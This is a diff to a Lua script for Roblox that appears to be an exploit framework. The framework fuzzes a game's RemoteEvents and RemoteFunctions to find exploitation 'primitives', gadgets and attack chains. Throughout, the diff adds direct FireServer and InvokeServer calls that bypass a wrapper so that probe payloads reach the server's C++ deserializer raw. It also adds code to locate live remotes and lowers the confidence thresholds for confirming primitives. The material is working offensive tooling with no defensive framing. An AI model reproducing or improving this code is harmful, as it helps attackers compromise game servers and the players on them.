@@ -60,10 +60,11 @@ local CFG = {
     -- Probe engine
     ProbeInterval        = 0.08,    -- seconds between probe fires
     ProbeTimeout         = 12.0,    -- max seconds per probe phase
-    AnomalyThreshold     = 0.35,    -- response deviation score to flag primitive
+    AnomalyThreshold     = 0.35,    -- log anything above this
+    PrimitiveTrigger     = 0.45,    -- trigger EvaluatePrimitive (lowered from 0.70)
     MaxProbesPerPhase    = 120,     -- cap per probe category
     -- Primitive tracker
-    PrimitiveConfMin     = 0.60,    -- min confidence to record as confirmed
+    PrimitiveConfMin     = 0.45,    -- min confidence to confirm primitive
     -- Gadget scanner
     GadgetMinScore       = 0.40,    -- min gadget utility score
     -- Chain assembler
@@ -72,6 +73,9 @@ local CFG = {
     -- Command surface
     HeartbeatInterval    = 2.5,     -- command surface keepalive
     CommandTimeout       = 8.0,     -- per-command execution timeout
+    -- Direct injection
+    DirectFireTimeout    = 5.0,     -- timeout for naked RemoteEvent:FireServer calls
+    DirectFireRetries    = 3,       -- retries per probe when direct fire fails
 }
 
 -- ── Probe catalog ─────────────────────────────────────────────────────────────
@@ -177,49 +181,151 @@ end
 local function getRSM()  return _G.PC and _G.PC.RSM  end
 local function getSTS()  return _G.PC and _G.PC.STS  end
 
+-- ── Direct injection: resolve live RemoteEvent/RemoteFunction instance ────────
+-- Bypasses ASE FinalizeDirective entirely. Reaches the C++ deserializer naked.
+-- Resolution order: STS topology → RSM registry → game DataModel walk.
+local function resolveRemoteInstance(remoteName)
+    -- 1. STS report has full path info
+    local STS = getSTS()
+    if STS and STS.Report and STS.Report.remoteIndex then
+        for _, entry in ipairs(STS.Report.remoteIndex) do
+            if entry.name == remoteName and entry.path then
+                local ok, inst = pcall(function()
+                    -- Walk the path from game root
+                    local parts = {}
+                    for part in (entry.path .. "."):gmatch("([^.]+)%.") do
+                        table.insert(parts, part)
+                    end
+                    local cur = game
+                    for _, part in ipairs(parts) do
+                        cur = cur:FindFirstChild(part) or
+                              pcall(function() return game:GetService(part) end) and
+                              game:GetService(part) or cur
+                        if not cur then return nil end
+                    end
+                    return cur
+                end)
+                if ok and inst and
+                   (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction")) then
+                    return inst
+                end
+            end
+        end
+    end
+
+    -- 2. RSM registry stores last-seen instance references
+    local RSM = getRSM()
+    if RSM and RSM.GetRegistry then
+        local ok, reg = pcall(RSM.GetRegistry)
+        if ok and reg then
+            for name, data in pairs(reg) do
+                if name == remoteName and data.instance and
+                   data.instance.Parent then
+                    return data.instance
+                end
+            end
+        end
+    end
+
+    -- 3. Brute DataModel walk across replicated services
+    local SEARCH_SERVICES = {
+        "ReplicatedStorage", "ReplicatedFirst",
+        "Workspace", "Players",
+    }
+    for _, svcName in ipairs(SEARCH_SERVICES) do
+        local ok, svc = pcall(function() return game:GetService(svcName) end)
+        if ok and svc then
+            local inst = svc:FindFirstChild(remoteName, true)
+            if inst and
+               (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction")) then
+                return inst
+            end
+        end
+    end
+
+    return nil
+end
+
+-- ── Naked fire: calls FireServer/InvokeServer directly on the instance ────────
+-- Returns: ok (bool), result, latency, fireMode ("RE" | "RF" | "FAILED")
+local function nakedFire(remoteInst, payload)
+    if not remoteInst then
+        return false, nil, 0, "FAILED"
+    end
+
+    local t0 = os.clock()
+
+    if remoteInst:IsA("RemoteEvent") then
+        local ok, err = pcall(function()
+            remoteInst:FireServer(payload)
+        end)
+        local latency = os.clock() - t0
+        return ok, nil, latency, "RE"  -- RE has no return value
+
+    elseif remoteInst:IsA("RemoteFunction") then
+        local ok, result = pcall(function()
+            return remoteInst:InvokeServer(payload)
+        end)
+        local latency = os.clock() - t0
+        return ok, ok and result or nil, latency, "RF"
+    end
+
+    return false, nil, 0, "FAILED"
+end
+
 -- ── Baseline recorder ─────────────────────────────────────────────────────────
 -- Before probing, record the server's normal response pattern to the sink
 -- remote. Any deviation from this baseline is an anomaly candidate.
 
 local function recordBaseline(sinkRemote)
-    local ASE = getASE()
-    if not ASE then return nil end
+    local remoteInst = resolveRemoteInstance(sinkRemote)
 
     local baseline = {
-        remote       = sinkRemote,
-        samples      = {},
-        avgLatency   = 0,
-        responseTypes= {},
-        errorRate    = 0,
-        recordedAt   = os.clock(),
+        remote        = sinkRemote,
+        remoteInst    = remoteInst,
+        fireMode      = remoteInst and
+                        (remoteInst:IsA("RemoteFunction") and "RF" or "RE") or "ASE",
+        samples       = {},
+        avgLatency    = 0,
+        responseTypes = {},
+        errorRate     = 0,
+        recordedAt    = os.clock(),
     }
 
-    log("INFO", string.format("Recording baseline for %s...", sinkRemote))
+    log("INFO", string.format(
+        "Recording baseline for %s  [fireMode=%s]",
+        sinkRemote, baseline.fireMode))
 
-    local SAMPLE_COUNT = 8
+    local SAMPLE_COUNT = 10
     local totalLatency = 0
     local errors = 0
 
     for i = 1, SAMPLE_COUNT do
-        local t0 = os.clock()
-        local ok, result = pcall(function()
-            return ASE.FinalizeDirective and
-                ASE.FinalizeDirective(sinkRemote, { __bre_baseline=true, sample=i }, sinkRemote)
-        end)
-        local latency = os.clock() - t0
+        local ok, result, latency
 
-        if ok and result then
+        if remoteInst then
+            local mode
+            ok, result, latency, mode = nakedFire(remoteInst,
+                { __bre_baseline=true, sample=i })
+        else
+            local ASE = getASE()
+            local t0 = os.clock()
+            ok, result = pcall(function()
+                return ASE and ASE.FinalizeDirective and
+                    ASE.FinalizeDirective(sinkRemote,
+                        { __bre_baseline=true, sample=i }, sinkRemote)
+            end)
+            latency = os.clock() - t0
+        end
+
+        if ok then
             totalLatency = totalLatency + latency
             local rtype = type(result)
             baseline.responseTypes[rtype] = (baseline.responseTypes[rtype] or 0) + 1
-            table.insert(baseline.samples, {
-                latency  = latency,
-                ok       = true,
-                rtype    = rtype,
-            })
+            table.insert(baseline.samples, { latency=latency, ok=true, rtype=rtype })
         else
             errors = errors + 1
-            table.insert(baseline.samples, { latency=latency, ok=false })
+            table.insert(baseline.samples, { latency=latency or 0, ok=false })
         end
         task.wait(0.1)
     end
@@ -228,8 +334,8 @@ local function recordBaseline(sinkRemote)
     baseline.errorRate  = errors / SAMPLE_COUNT
 
     log("INFO", string.format(
-        "Baseline: avgLatency=%.3fs  errorRate=%.0f%%",
-        baseline.avgLatency, baseline.errorRate * 100))
+        "Baseline: avgLatency=%.4fs  errorRate=%.0f%%  fireMode=%s",
+        baseline.avgLatency, baseline.errorRate * 100, baseline.fireMode))
 
     return baseline
 end
@@ -327,17 +433,25 @@ local function scoreAnomaly(baseline, probeResult, latency)
     local score = 0
     local reasons = {}
 
-    -- Latency spike
+    -- Latency analysis
     if baseline.avgLatency > 0 then
         local ratio = latency / baseline.avgLatency
-        if ratio > 3.0 then
-            score = score + 0.30
+        if ratio > 5.0 then
+            -- EXPANSION: C++ deserializer struggling to allocate — primitive heartbeat
+            score = score + 0.55
+            table.insert(reasons, string.format("latency EXPANSION %.1fx — C-side stall candidate", ratio))
+        elseif ratio > 3.0 then
+            score = score + 0.35
             table.insert(reasons, string.format("latency spike %.1fx", ratio))
         elseif ratio > 1.8 then
-            score = score + 0.15
-            table.insert(reasons, string.format("latency elevated %.1fx", ratio))
-        elseif ratio < 0.3 then
             score = score + 0.20
+            table.insert(reasons, string.format("latency elevated %.1fx", ratio))
+        elseif ratio < 0.25 then
+            -- COLLAPSE: schema rejection at C++ boundary — confirms naked fire hit deserializer
+            score = score + 0.25
+            table.insert(reasons, string.format("latency collapse %.1fx — schema rejection at C boundary", ratio))
+        elseif ratio < 0.5 then
+            score = score + 0.15
             table.insert(reasons, string.format("latency collapse %.1fx", ratio))
         end
     end
@@ -426,22 +540,35 @@ function BRE.RunProbePhase()
                 log("INFO", string.format("Probing: %s — %s", cat.id, cat.label))
                 local catAnomalies = 0
 
+                local probe_fireMode = "UNKNOWN"
                 for idx = 1, CFG.MaxProbesPerPhase do
                     if BRE.CurrentState ~= BRE.STATE.PROBING then break end
 
                     local payload = generateProbe(cat.id, idx)
                     local t0 = os.clock()
 
-                    local fireOk, fireResult = pcall(function()
-                        if ASE.FinalizeDirective then
-                            return ASE.FinalizeDirective(sinkRemote, payload, sinkRemote)
-                        end
-                        return nil
-                    end)
+                    -- NAKED DIRECT INJECTION: bypass ASE envelope entirely.
+                    -- Payload hits the C++ deserializer raw.
+                    local fireOk, fireResult, latency
+                    if baseline.remoteInst then
+                        local mode
+                        fireOk, fireResult, latency, mode =
+                            nakedFire(baseline.remoteInst, payload)
+                        probe_fireMode = mode
+                    else
+                        -- Fallback: ASE envelope (bubble-wrapped, lower fidelity)
+                        local fOk, fRes = pcall(function()
+                            local ASE2 = getASE()
+                            return ASE2 and ASE2.FinalizeDirective and
+                                ASE2.FinalizeDirective(sinkRemote, payload, sinkRemote)
+                        end)
+                        fireOk, fireResult, latency =
+                            fOk, fOk and fRes or nil, os.clock() - t0
+                        probe_fireMode = "ASE"
+                    end
+                    latency = latency or (os.clock() - t0)
 
-                    local latency = os.clock() - t0
                     local result = fireOk and fireResult or nil
-
                     -- Score anomaly
                     local aScore, aReason = scoreAnomaly(baseline, result, latency)
 
@@ -456,6 +583,7 @@ function BRE.RunProbePhase()
                         anomalyReason=aReason,
                         firedAt     = os.clock(),
                         sinkRemote  = sinkRemote,
+                        fireMode    = probe_fireMode,
                     }
 
                     BRE.Stats.totalProbes = BRE.Stats.totalProbes + 1
@@ -487,7 +615,7 @@ function BRE.RunProbePhase()
                         end
 
                         -- High-confidence anomaly — escalate to primitive check
-                        if aScore >= 0.70 then
+                        if aScore >= CFG.PrimitiveTrigger then
                             BRE.EvaluatePrimitive(probe, baseline)
                         end
                     end
@@ -551,11 +679,21 @@ function BRE.EvaluatePrimitive(triggerProbe, baseline)
 
             for attempt = 1, 5 do
                 local t0 = os.clock()
-                local fOk, fResult = pcall(function()
-                    return ASE.FinalizeDirective and
-                    ASE.FinalizeDirective(sinkRemote, triggerProbe.payload, sinkRemote)
-                end)
-                local latency = os.clock() - t0
+                local fOk, fResult, latency
+                if baseline.remoteInst then
+                    local mode
+                    fOk, fResult, latency, mode =
+                        nakedFire(baseline.remoteInst, triggerProbe.payload)
+                else
+                    local ASE2 = getASE()
+                    local t1 = os.clock()
+                    fOk, fResult = pcall(function()
+                        return ASE2 and ASE2.FinalizeDirective and
+                            ASE2.FinalizeDirective(sinkRemote, triggerProbe.payload, sinkRemote)
+                    end)
+                    latency = os.clock() - t1
+                end
+                latency = latency or (os.clock() - t0)
                 local aScore  = scoreAnomaly(baseline, fOk and fResult or nil, latency)
 
                 if aScore >= CFG.AnomalyThreshold then
